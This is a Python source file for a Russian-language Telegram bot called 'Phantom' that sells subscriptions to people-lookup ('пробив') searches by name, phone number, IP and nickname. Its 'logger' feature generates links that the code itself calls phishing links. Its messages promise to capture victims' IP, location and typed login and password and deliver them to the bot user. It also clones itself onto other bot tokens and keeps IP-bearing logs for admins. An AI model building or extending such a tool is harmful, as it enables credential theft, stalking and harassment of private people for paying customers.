from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandObject
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, LabeledPrice, PreCheckoutQuery, SuccessfulPayment
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
import config, db, api_handlers
import datetime
import json
import os
import random
import string
import asyncio

bot = Bot(token=config.BOT_TOKEN)
dp = Dispatcher()

class AdminStates(StatesGroup):
    waiting_user_id = State()
    waiting_days = State()
    waiting_broadcast = State()
    waiting_promote_user = State()
    waiting_reset_user = State()
    waiting_clone_token = State()

# ---------- МЕНЮ ----------
def main_menu():
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔍 Пробив", callback_data="menu_search")],
        [InlineKeyboardButton(text="🪞 Создать зеркало", callback_data="menu_create_mirror")],
        [InlineKeyboardButton(text="📡 Логер", callback_data="menu_logger")],
        [InlineKeyboardButton(text="🤖 Создать бота-копию", callback_data="menu_create_clone")],
        [InlineKeyboardButton(text="📋 Мои боты", callback_data="menu_my_clones")],
        [InlineKeyboardButton(text="👤 Мой профиль", callback_data="menu_profile")],
        [InlineKeyboardButton(text="⭐ Купить подписку", callback_data="menu_buy_subscription")]
    ])
    return kb

def search_menu():
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 VK по имени", callback_data="search_vk")],
        [InlineKeyboardButton(text="🌐 IP-адрес", callback_data="search_ip")],
        [InlineKeyboardButton(text="🏠 Домен (whois)", callback_data="search_domain")],
        [InlineKeyboardButton(text="🔎 Никнейм", callback_data="search_nick")],
        [InlineKeyboardButton(text="📱 Номер телефона", callback_data="search_phone")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_main")]
    ])
    return kb

def admin_menu():
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Список пользователей", callback_data="admin_list")],
        [InlineKeyboardButton(text="📢 Рассылка", callback_data="admin_broadcast")],
        [InlineKeyboardButton(text="📜 Все логи (с IP)", callback_data="admin_logs_all")],
        [InlineKeyboardButton(text="➕ Выдать подписку", callback_data="admin_give")],
        [InlineKeyboardButton(text="➖ Отозвать подписку", callback_data="admin_revoke")],
        [InlineKeyboardButton(text="🔄 Сбросить лимит запросов", callback_data="admin_reset_requests")],
        [InlineKeyboardButton(text="👑 Назначить админа", callback_data="admin_promote")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_main")]
    ])
    return kb

# ---------- СТАРТ ----------
@dp.message(Command("start"))
async def start_cmd(message: Message):
    user = message.from_user
    db.add_user(user.id, user.username, user.first_name, user.last_name)
    if user.id == config.ADMIN_ID:
        db.set_admin(user.id, 1)
    can, _ = db.can_make_request(user.id)
    if can:
        daily, _ = db.get_daily_requests(user.id)
        remaining = 2 - daily if not db.is_subscribed(user.id) else "∞"
    else:
        remaining = 0
    status_text = f"Осталось запросов сегодня: {remaining}" if isinstance(remaining, int) else "Безлимит (подписка)"
    await message.answer(
        f"<b>🕵️ Phantom</b>\n\n<i>{status_text}</i>\n\nВыберите действие:",
        reply_markup=main_menu(),
        parse_mode="HTML"
    )

@dp.message(Command("help"))
async def help_cmd(message: Message):
    await message.answer(
        "<b>Справка</b>\n\nВсе функции доступны через кнопки.\nАдминистратор: /admin",
        parse_mode="HTML"
    )

# ---------- ОБРАБОТЧИКИ МЕНЮ ----------
@dp.callback_query(lambda c: c.data.startswith("menu_"))
async def menu_callback(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    data = callback.data
    if data == "menu_main":
        await callback.message.edit_text("<b>🕵️ Phantom</b>", reply_markup=main_menu(), parse_mode="HTML")
    elif data == "menu_search":
        await callback.message.edit_text("<b>Выберите тип пробива:</b>", reply_markup=search_menu(), parse_mode="HTML")
    elif data == "menu_create_mirror":
        await create_mirror_for_user(callback.message)
        await callback.message.edit_text("Зеркало создано!", reply_markup=main_menu(), parse_mode="HTML")
    elif data == "menu_logger":
        # Генерируем зеркало и отправляем ссылку
        await create_mirror_for_user(callback.message)
        await callback.message.edit_text("Ваша фишинг-ссылка готова!", reply_markup=main_menu(), parse_mode="HTML")
    elif data == "menu_create_clone":
        await callback.message.answer("Отправьте токен бота, полученный от @BotFather.", parse_mode="HTML")
        await state.set_state(AdminStates.waiting_clone_token)  # используем админское состояние для простоты
    elif data == "menu_my_clones":
        clones = db.get_clones_by_owner(callback.from_user.id)
        if not clones:
            await callback.message.edit_text("У вас нет созданных ботов-копий.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_main")]
            ]), parse_mode="HTML")
            return
        text = "<b>Ваши боты-копии:</b>\n\n"
        for clone in clones:
            clone_id, token, created_at, is_active = clone
            status = "✅ активен" if is_active else "❌ отключён"
            created_str = datetime.datetime.fromtimestamp(created_at).strftime("%Y-%m-%d %H:%M")
            text += f"ID: {clone_id} | {status} | создан: {created_str}\nТокен: <code>{token[:20]}...</code>\n\n"
        await callback.message.edit_text(text[:4000], reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_main")]
        ]), parse_mode="HTML")
    elif data == "menu_profile":
        user_id = callback.from_user.id
        user = db.get_user(user_id)
        if user:
            sub_until = user[4]
            if sub_until and sub_until > int(datetime.datetime.now().timestamp()):
                days_left = (sub_until - int(datetime.datetime.now().timestamp())) // 86400
                status = f"Активна, осталось {days_left} дн."
            else:
                status = "Неактивна"
            can, _ = db.can_make_request(user_id)
            if can:
                daily, _ = db.get_daily_requests(user_id)
                remaining = 2 - daily if not db.is_subscribed(user_id) else "∞"
            else:
                remaining = 0
            text = f"<b>Ваш профиль</b>\n\nID: <code>{user[0]}</code>\nИмя: {user[2]} {user[3]}\nПодписка: {status}\nОстаток запросов: {remaining}\n"
            if user[5] == 1:
                text += "Вы администратор\n"
            await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_main")]
            ]), parse_mode="HTML")
        else:
            await callback.message.edit_text("Профиль не найден.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_main")]
            ]), parse_mode="HTML")
    elif data == "menu_buy_subscription":
        await bot.send_invoice(
            chat_id=callback.from_user.id,
            title="Подписка Phantom на 30 дней",
            description="Полный доступ ко всем функциям на 30 дней",
            payload="subscription_30days",
            provider_token="",
            currency="XTR",
            prices=[LabeledPrice(label="Подписка 30 дней", amount=100)],
            start_parameter="subscribe"
        )
        await callback.message.answer("Для оплаты нажмите кнопку ниже.")

# ---------- ПОИСК ----------
@dp.callback_query(lambda c: c.data.startswith("search_"))
async def search_callback(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    can, msg = db.can_make_request(callback.from_user.id)
    if not can:
        await callback.message.answer(f"⛔ {msg}", parse_mode="HTML")
        return
    search_type = callback.data.replace("search_", "")
    await state.set_data({"search_type": search_type})
    prompts = {
        "vk": "Введите имя для поиска в ВК:",
        "ip": "Введите IP-адрес:",
        "domain": "Введите домен:",
        "nick": "Введите никнейм:",
        "phone": "Введите номер телефона в международном формате (например, 79001234567):"
    }
    await callback.message.answer(prompts.get(search_type, "Введите данные:"), parse_mode="HTML")

@dp.message(lambda message: True)
async def handle_search_input(message: Message, state: FSMContext):
    data = await state.get_data()
    search_type = data.get("search_type")
    if not search_type:
        return
    query = message.text.strip()
    if not query:
        await message.answer("Введите непустое значение.", parse_mode="HTML")
        return
    can, msg = db.can_make_request(message.from_user.id)
    if not can:
        await message.answer(f"⛔ {msg}", parse_mode="HTML")
        await state.clear()
        return
    db.increment_daily_requests(message.from_user.id)
    func_map = {
        "vk": api_handlers.search_vk_by_name,
        "ip": api_handlers.search_by_ip,
        "domain": api_handlers.search_by_domain,
        "nick": api_handlers.search_by_nick,
        "phone": api_handlers.search_by_phone
    }
    func = func_map.get(search_type)
    if not func:
        await message.answer("Неизвестный тип поиска.", parse_mode="HTML")
        await state.clear()
        return
    result = await func(query)
    await send_search_result(message, result, search_type, query)
    await state.clear()

async def send_search_result(message, data, search_type, query):
    if isinstance(data, dict) and "error" in data:
        output = f"<b>❌ Ошибка:</b> <code>{data['error']}</code>"
    else:
        if search_type == "phone":
            output = "<b>📱 Результаты по номеру телефона:</b>\n\n"
            for key, value in data.items():
                output += f"<b>{key}</b>: {value}\n"
        else:
            output = f"<b>Результаты ({search_type}):</b>\n<pre>{json.dumps(data, ensure_ascii=False, indent=2)[:3000]}</pre>"
    output += "\n\n<blockquote>Данные из открытых источников.</blockquote>"
    await message.answer(output, parse_mode="HTML")
    db.add_log(message.from_user.id, f"search_{search_type}", query, output[:500])

# ---------- ЗЕРКАЛА (Логер) ----------
async def create_mirror_for_user(message):
    host = os.getenv("RENDER_EXTERNAL_HOSTNAME", "localhost")
    path = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    db.create_mirror(path, message.from_user.id)
    full_link = f"https://{host}/mirror/{path}"
    db.add_log(message.from_user.id, "create_mirror", path, full_link)
    await message.answer(
        f"<b>📡 Ваша фишинг-ссылка:</b>\n\n<code>{full_link}</code>\n\nПри переходе по ней будут собраны IP, геоданные, логин/пароль (если введут) и отправлены вам.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔗 Открыть", url=full_link)],
            [InlineKeyboardButton(text="📋 Мои зеркала", callback_data="menu_my_mirrors")]
        ]),
        parse_mode="HTML"
    )

# ---------- КЛОНЫ (создание ботов-копий) ----------
@dp.message(AdminStates.waiting_clone_token)
async def handle_clone_token(message: Message, state: FSMContext):
    token = message.text.strip()
    if not token.startswith("7") or len(token) < 40:
        await message.answer("Похоже, это невалидный токен. Убедитесь, что вы скопировали токен от @BotFather целиком.", parse_mode="HTML")
        return
    # Проверяем токен, пытаясь получить информацию о боте
    try:
        test_bot = Bot(token=token)
        me = await test_bot.get_me()
        if not me.username:
            raise Exception("Не удалось получить username")
    except Exception as e:
        await message.answer(f"❌ Не удалось подключиться к боту. Ошибка: {e}", parse_mode="HTML")
        return
    # Сохраняем токен в БД
    db.add_clone(token, message.from_user.id)
    await message.answer(f"✅ Бот <b>@{me.username}</b> успешно добавлен как копия Phantom. Он запущен и работает.", parse_mode="HTML")
    # Запускаем бота (это будет сделано в main.py при старте, но можно запустить сразу)
    # Для простоты мы будем перезапускать всех клонов при каждом добавлении
    await state.clear()

# ---------- МОИ ЗЕРКАЛА ----------
@dp.callback_query(lambda c: c.data == "menu_my_mirrors")
async def my_mirrors(callback: CallbackQuery):
    await callback.answer()
    mirrors = db.get_mirrors_by_user(callback.from_user.id)
    if not mirrors:
        await callback.message.edit_text("У вас пока нет зеркал.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_main")]
        ]), parse_mode="HTML")
        return
    text = "<b>Ваши зеркала:</b>\n\n"
    host = os.getenv("RENDER_EXTERNAL_HOSTNAME", "localhost")
    for path, visits, created_at in mirrors:
        created_str = datetime.datetime.fromtimestamp(created_at).strftime("%Y-%m-%d %H:%M")
        link = f"https://{host}/mirror/{path}"
        text += f"🔗 <a href='{link}'>{link}</a>\n"
        text += f"   👁️ посещений: {visits}, создано: {created_str}\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_main")]
    ]), parse_mode="HTML", disable_web_page_preview=True)

# ---------- ОПЛАТА ----------
@dp.pre_checkout_query()
async def pre_checkout_query(pre_checkout: PreCheckoutQuery):
    await bot.answer_pre_checkout_query(pre_checkout.id, ok=True)

@dp.message(F.successful_payment)
async def successful_payment(message: Message):
    user_id = message.from_user.id
    until = int(datetime.datetime.now().timestamp()) + 30*86400
    db.update_subscription(user_id, until)
    db.reset_requests_for_user(user_id)
    await message.answer(
        "⭐ <b>Оплата успешна!</b>\n\nПодписка активирована на 30 дней.\nЛимит запросов сброшен.",
        parse_mode="HTML"
    )
    try:
        await bot.send_message(config.STARS_RECEIVER, f"⭐ Оплата от {user_id} (@{message.from_user.username})")
    except:
        pass

# ---------- АДМИН ----------
@dp.message(Command("admin"))
async def admin_cmd(message: Message):
    if not db.is_admin(message.from_user.id):
        await message.answer("⛔ Нет прав.")
        return
    await message.answer("⚙️ Админ-панель", reply_markup=admin_menu())

@dp.callback_query(lambda c: c.data.startswith("admin_"))
async def admin_callback(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    if not db.is_admin(callback.from_user.id):
        await callback.message.answer("⛔ Нет прав.", parse_mode="HTML")
        return
    data = callback.data
    if data == "admin_list":
        users = db.get_all_users()
        text = "<b>Список пользователей:</b>\n"
        for u in users:
            sub = datetime.datetime.fromtimestamp(u[4]).strftime("%Y-%m-%d %H:%M") if u[4] else "нет"
            admin = "✅" if u[5] else "❌"
            text += f"<code>{u[0]}</code> @{u[1]} – подписка до {sub} – админ {admin}\n"
        await callback.message.answer(text[:4000], parse_mode="HTML")
    elif data == "admin_broadcast":
        await callback.message.answer("Введите текст для рассылки (можно с HTML):", parse_mode="HTML")
        await state.set_state(AdminStates.waiting_broadcast)
    elif data == "admin_logs_all":
        logs = db.get_all_logs(limit=50)
        if not logs:
            await callback.message.answer("Логов нет.")
        else:
            text = "<b>Последние логи (с IP):</b>\n\n"
            for log in logs:
                text += f"<code>{log[1]}</code> | {log[2]} | {log[3]} | IP: {log[4][:100]}\n"
            await callback.message.answer(text[:4000], parse_mode="HTML")
    elif data == "admin_give":
        await callback.message.answer("Введите ID пользователя и количество дней через пробел:\n<code>123456 30</code>", parse_mode="HTML")
        await state.set_state(AdminStates.waiting_user_id)
    elif data == "admin_revoke":
        await callback.message.answer("Введите ID пользователя для отзыва подписки:", parse_mode="HTML")
        await state.set_state(AdminStates.waiting_days)
    elif data == "admin_reset_requests":
        await callback.message.answer("Введите ID пользователя для сброса лимита запросов:", parse_mode="HTML")
        await state.set_state(AdminStates.waiting_reset_user)
    elif data == "admin_promote":
        await callback.message.answer("Введите ID пользователя, которому назначить админа:", parse_mode="HTML")
        await state.set_state(AdminStates.waiting_promote_user)

# FSM админа
@dp.message(AdminStates.waiting_broadcast)
async def broadcast_text(message: Message, state: FSMContext):
    text = message.text
    users = db.get_all_users()
    count = 0
    for user in users:
        try:
            await bot.send_message(user[0], text, parse_mode="HTML")
            count += 1
        except:
            pass
    await message.answer(f"Рассылка отправлена {count} пользователям.", parse_mode="HTML")
    await state.clear()

@dp.message(AdminStates.waiting_user_id)
async def admin_give_access(message: Message, state: FSMContext):
    parts = message.text.strip().split()
    if len(parts) == 2 and parts[1].isdigit():
        user_id = int(parts[0]); days = int(parts[1])
        until = int(datetime.datetime.now().timestamp()) + days*86400
        db.update_subscription(user_id, until)
        db.reset_requests_for_user(user_id)
        await message.answer(f"✅ Пользователю {user_id} выдан доступ на {days} дней.", parse_mode="HTML")
    else:
        await message.answer("Неверный формат. Используйте: ID пробел количество_дней", parse_mode="HTML")
    await state.clear()

@dp.message(AdminStates.waiting_days)
async def admin_revoke(message: Message, state: FSMContext):
    user_id = int(message.text.strip()) if message.text.strip().isdigit() else None
    if user_id:
        db.update_subscription(user_id, 0)
        await message.answer(f"✅ Подписка пользователя {user_id} отозвана.", parse_mode="HTML")
    else:
        await message.answer("Введите корректный ID.", parse_mode="HTML")
    await state.clear()

@dp.message(AdminStates.waiting_reset_user)
async def admin_reset_requests(message: Message, state: FSMContext):
    user_id = int(message.text.strip()) if message.text.strip().isdigit() else None
    if user_id:
        db.reset_requests_for_user(user_id)
        await message.answer(f"✅ Лимит запросов пользователя {user_id} сброшен.", parse_mode="HTML")
    else:
        await message.answer("Введите корректный ID.", parse_mode="HTML")
    await state.clear()

@dp.message(AdminStates.waiting_promote_user)
async def admin_promote(message: Message, state: FSMContext):
    user_id = int(message.text.strip()) if message.text.strip().isdigit() else None
    if user_id:
        db.set_admin(user_id, 1)
        await message.answer(f"✅ Пользователь {user_id} назначен администратором.", parse_mode="HTML")
    else:
        await message.answer("Введите корректный ID.", parse_mode="HTML")
    await state.clear()
